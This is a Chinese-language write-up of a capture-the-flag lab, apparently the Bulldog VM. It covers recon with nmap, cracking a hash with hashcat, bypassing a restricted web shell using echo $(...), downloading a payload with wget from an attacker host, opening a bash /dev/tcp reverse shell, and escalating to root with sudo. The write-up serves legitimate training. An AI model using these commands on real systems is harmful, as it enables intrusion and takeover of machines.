
## 靶机信息

- 级别:容易/中级


## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.157
sudo nmap --min-rate 10000 -sT -p- 192.168.1.157 -oA tcp_scan/ports
PORT     STATE SERVICE
23/tcp   open  telnet
80/tcp   open  http
8080/tcp open  http-proxy
```


## Web
![[Pasted image 20231015140807.png]]
view-source:http://192.168.1.157/dev/
![[Pasted image 20231015141250.png]]
```shell
hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o hash_crack.txt
爆出 ddf45997a7e18a25ad5f5cf222da64814dd060d5:bulldog
//得到一组凭证 nick，bulldog
```

```shell
http://192.168.1.157/admin/
nick,bulldog //成功登录
```

![[Pasted image 20231015145356.png]]
此时转到http://192.168.1.157/dev/shell/即可使用shell
![[Pasted image 20231015145500.png]]
此时尝试命令发现很多命令不能使用，提示可以用echo
![[Pasted image 20231015150032.png]]
```shell
echo $(wget http://192.168.1.136/shell.php) //成功执行wget
echo $(chmod +x shell.php)
echo $(./shell.php)
多次尝试后发现无法执行php的shell
用sh写一个反弹shell
bash -i >& /dev/tcp/192.168.1.136/1234 0>&1
1. `bash -i`：启动一个交互式的 Bash shell。 `-i` 标志表示交互式模式，它允许用户与shell进行实时的输入和输出。
    
2. `>& /dev/tcp/192.168.1.136/1234`：这部分将 Bash shell 的标准输出和标准错误重定向到指定的网络套接字。 `/dev/tcp/192.168.1.136/1234` 指定要连接的远程服务器的 IP 地址和端口。这将导致所有的 shell 输出被发送到指定的 IP 地址和端口。
    
3. `0>&1`：这部分将标准输入（0）重定向到标准输出（1），这样用户可以从远程服务器的输入通道接收数据。

webnshell中 bash shell.sh 即可反弹shell 
```

## 提权

```shell
/home/bulldogadmin/.hiddenadmindirectory
```
![[Pasted image 20231015182113.png]]
note文件中看到提示
```shell
strings customPermissionApp
//得到一组凭证,django，SUPERultimatePASSWORDyouCANTget
```
![[Pasted image 20231015182236.png]]

```shell
ssh -p 23 django@192.168.1.157
PASSWD: SUPERultimatePASSWORDyouCANTget
sudo -l
```
![[Pasted image 20231015182758.png]]
```
三个ALL 直sudo su 即可提权
```
![[Pasted image 20231015182838.png]]
